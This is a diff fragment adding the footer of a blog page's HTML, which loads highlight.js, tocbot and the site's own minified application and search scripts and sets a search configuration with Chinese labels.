+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/php.min.js" defer></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="http://blog.zhishibee.com/js/application.min.bdeb64b910570b6c41badc6a05b7afb0c8ad9efd8525de3c7257d59e786326a3.js"></script>
+<script src="http://blog.zhishibee.com/js/plugin.min.51ff8c7317566f82259170fa36e09c4493adc9b9378b427a01ad3f017ebac7dd.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(未命名)',
+            },
+            ROOT_URL: 'http:\/\/blog.zhishibee.com\/',
+            CONTENT_URL: 'http:\/\/blog.zhishibee.com\/\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="http://blog.zhishibee.com/js/insight.min.a343cd9a5a7698336b28ef3a7c16a3a1b1d2d5fb17dc8ed04022bbe08cc5459073a15bdafa3a8a58cdd56080784bdd69fa70b1ae8597565c799c57ed00f0e120.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+  </body>
+</html>
